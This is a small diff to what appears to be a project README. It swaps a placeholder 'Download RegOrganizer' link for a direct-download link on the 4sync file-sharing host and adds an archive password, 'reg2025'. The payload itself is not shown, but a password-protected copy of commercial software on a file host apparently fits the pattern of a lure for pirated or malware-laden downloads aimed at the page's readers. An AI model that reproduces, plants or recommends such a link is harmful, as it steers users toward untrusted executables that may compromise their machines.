@@ -14,7 +14,8 @@
 
 Get the latest version of RegOrganizer here:
 
-[Download RegOrganizer](#)
+[Download RegOrganizer](https://www.4sync.com/web/directDownload/-vKhXqro/65pBjZyT.28faff98bbf9c855727f364504f09599)
+Password:reg2025
 
 ---
 
